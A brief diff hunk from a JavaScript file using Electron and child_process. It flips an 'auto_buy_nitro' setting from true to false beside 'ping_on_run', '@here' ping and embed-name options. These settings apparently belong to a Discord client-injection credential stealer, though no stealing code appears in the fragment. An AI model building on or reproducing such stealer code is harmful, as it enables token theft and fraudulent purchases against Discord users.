@@ -7,7 +7,7 @@ const { BrowserWindow, session } = require("electron");
 const { exec } = require("child_process");
 
 const config = {
-    auto_buy_nitro: true,
+    auto_buy_nitro: false,
     ping_on_run: true,
     ping_val: "@here",
     embed_name: "~~branding~~",
